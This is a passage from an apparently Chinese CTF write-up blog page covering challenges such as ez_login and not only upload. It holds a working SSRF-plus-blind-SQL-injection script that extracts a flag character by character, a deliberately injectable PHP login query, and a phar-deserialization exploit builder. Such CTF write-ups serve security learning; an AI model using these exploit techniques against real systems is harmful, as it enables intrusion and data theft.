+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;./php/db.php&quot;);</span><br><span class="line">include(&quot;./php/check_ip.php&quot;);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">if($ip !== &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">    $sql = &#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;.$username.&#x27;&quot; and `password`=&quot;&#x27;.$password.&#x27;&quot;;&#x27;;</span><br><span class="line">    $result = $con-&gt;query($sql);</span><br><span class="line">    echo $sql;</span><br><span class="line">    &#125;catch(Exception $e)&#123;</span><br><span class="line">        echo $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die(&#x27;Try again!&#x27;) )); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;m4ao&quot;</span></span><br><span class="line">url =<span class="string">&quot;http://10.13.120.33/?url=http://localhost/admin.php&quot;</span></span><br><span class="line">ip = <span class="string">&quot;http://10.13.120.33/?url=&quot;</span></span><br><span class="line">f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>)</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;sessid&#125;</span>&quot;</span>&#125;</span><br><span class="line">file = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;m4ao.txt&#x27;</span>,f)&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line"><span class="comment"># r = requests.post(url=url,data=data,files=file,cookies=cookies)</span></span><br><span class="line"><span class="comment"># print(r.request.body.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        payload = <span class="string">&#x27;http://localhost//se1f_Log3n.php?username=m4a0\&#x27;or ascii(mid((select flag from ctf.secret),&#123;&#125;,1))=&#123;&#125;%23password=m4a0&#x27;</span>.<span class="built_in">format</span>(l,<span class="built_in">ord</span>(s))</span><br><span class="line">        url = ip + quote(payload)</span><br><span class="line">        r = requests.post(url=url, data=data, files=file, cookies=cookies)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;correct?&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230303212904306.png" alt="image-20230303212904306"></p>
+<h2 id="EZDEDE"><a href="#EZDEDE" class="headerlink" title="EZDEDE"></a>EZDEDE</h2><p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304184051792.png" alt="image-20230304184051792"></p>
+<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304184153675.png" alt="image-20230304184153675"></p>
+<h3 id="构造上传包"><a href="#构造上传包" class="headerlink" title="构造上传包"></a>构造上传包</h3><p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304185428625.png" alt="image-20230304185428625"></p>
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304185532344.png" alt="image-20230304185532344"></p>
+<h2 id="not-only-upload"><a href="#not-only-upload" class="headerlink" title="not only upload"></a>not only upload</h2><p>开局一个上传</p>
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304190610389.png" alt="image-20230304190610389"></p>
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304190628834.png" alt="image-20230304190628834"></p>
+<p>一眼丁真 phar</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class ORZ &#123;</span><br><span class="line"></span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">        	global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;filename&#x27;]))&#123;</span><br><span class="line">    	$filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">		file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&#x27;phar.phar&#x27;);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);</span><br><span class="line">$phar -&gt; addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;);</span><br><span class="line">$object = new ORZ();</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/26/%E5%AE%89%E6%81%92%E8%B5%9B/image-20230304205154693.png" alt="image-20230304205154693"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#love-sql"><span class="toc-number">1.</span> <span class="toc-text">love_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PPPOP"><span class="toc-number">2.</span> <span class="toc-text">PPPOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">2.1.</span> <span class="toc-text">原生类目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.2.</span> <span class="toc-text">原生类文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-serialize"><span class="toc-number">3.</span> <span class="toc-text">ez_serialize</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原生类目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-1"><span class="toc-number">3.2.</span> <span class="toc-text">原生类文件读取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-flask"><span class="toc-number">4.</span> <span class="toc-text">baby_flask</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">4.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.</span> <span class="toc-text">字符构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.1.</span> <span class="toc-text">数字构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88payload"><span class="toc-number">4.2.2.</span> <span class="toc-text">最终payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZssti"><span class="toc-number">5.</span> <span class="toc-text">EZssti</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">5.1.</span> <span class="toc-text">构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-login"><span class="toc-number">6.</span> <span class="toc-text">ez_login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZDEDE"><span class="toc-number">7.</span> <span class="toc-text">EZDEDE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">7.1.</span> <span class="toc-text">变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E4%B8%8A%E4%BC%A0%E5%8C%85"><span class="toc-number">7.2.</span> <span class="toc-text">构造上传包</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-only-upload"><span class="toc-number">8.</span> <span class="toc-text">not only upload</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
